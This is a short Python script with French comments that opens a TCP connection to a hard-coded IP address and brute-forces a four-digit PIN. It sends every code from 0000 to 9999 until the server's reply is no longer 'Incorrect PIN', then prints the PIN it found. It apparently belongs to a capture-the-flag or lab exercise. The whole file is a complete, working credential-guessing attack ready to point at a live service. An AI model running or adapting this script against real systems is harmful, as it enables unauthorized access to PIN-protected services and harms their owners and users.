import os, sys, socket

server = "51.38.191.157"
port = 12345

ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	ma_socket.connect((server, port))
except Exception as e:
	print("Problème de connexion", e.args)
	sys.exit(1)

ligne = ma_socket.recv(1024)
print(ligne)

for i in range(10000):
	pin=f"{i:04d}"    #Génere toutes les codes de 0 à 9999
	ma_socket.sendall(pin.encode("utf-8")+ b"\n")  #Envoie le PIN au serveur
	ligne=ma_socket.recv(1024)
	
	#Verifie si c'est le bon mot de passe et des qu'on trouve, on arrête la boucle
	if ligne!=b'Incorrect PIN\n':
		print("Réponse du serveur: ", ligne)
		print("Mot de passe trouvé: ", pin)
		break

ma_socket.close()

